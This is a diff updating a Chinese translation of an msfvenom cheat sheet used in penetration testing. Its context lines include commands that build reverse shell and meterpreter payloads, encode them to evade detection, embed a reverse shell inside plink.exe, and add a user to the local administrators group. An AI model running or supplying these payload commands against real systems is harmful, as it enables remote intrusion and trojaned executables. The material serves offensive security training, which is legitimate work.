@@ -1,19 +1,21 @@
-# MSFVenom - CheatSheet
+# MSFVenom - 速查表
+
+{{#include ../../banners/hacktricks-training.md}}
 
 ---
 
-## Basic msfvenom
+## 基本 msfvenom
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
 使用 `-a` 选择 payload 架构，使用 `--platform` 选择其目标平台。<sup>[[1]](#references)</sup>
 
-## 列表
+## 列出
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-这些命令会列出已安装 framework 中可用的 payload 和 encoder 模块。<sup>[[1]](#references)</sup>
+这些命令列出了已安装 framework 中可用的 payload 和 encoder 模块。<sup>[[1]](#references)</sup>
 
 ## 创建 shellcode 时的常用参数
 ```bash
@@ -23,7 +25,7 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
-此处显示的 flags 用于选择 bad characters、输出格式、encoder 和 encoding iterations。<sup>[[1]](#references)</sup>
+这些 flags 用于选择 bad characters、输出格式、encoder 和 encoding iterations。<sup>[[1]](#references)</sup>
 
 ## **Windows**
 
@@ -52,7 +54,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net localgroup administr
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe > encoded.exe
 ```
-### 嵌入可执行文件内部
+### 嵌入可执行文件中
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x /usr/share/windows-binaries/plink.exe -f exe -o plinkmeter.exe
 ```
